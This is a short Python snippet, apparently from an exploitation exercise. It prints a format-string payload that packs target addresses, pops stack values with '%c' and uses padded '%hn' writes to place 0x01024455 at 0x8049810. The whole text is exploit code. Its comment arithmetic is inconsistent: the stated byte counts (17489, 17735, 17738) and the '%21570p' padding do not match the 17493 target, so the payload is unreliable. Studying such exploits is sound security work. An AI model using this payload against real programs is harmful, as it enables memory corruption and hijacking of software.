# Target address:   0x8049810   0x01024455
#   First half:     0x8049812   0x0102 == 258
#   Second half:    0x8049810   0x4455 == 17493

print("\x12\x98\x04\x08" +  # first address                     4       254 17489
      "\x10\x98\x04\x08" +  # checkpoint                        8       250 17985
      "\x10\x98\x04\x08" +  # second address (real)             12      246 17985
      "%c" * 10 +           # pop 10 variables off the stack    22      236 17975
      "%236u" +             # writes the 236 left               258     0   17735
      "%hn" +               # writes 258 to the addr            258     0   17735
      "%21570p" +           # writes the 17735 left             17489   0   0
      "%hn"                 # writes 17738 to the addr          17489   0   0
      )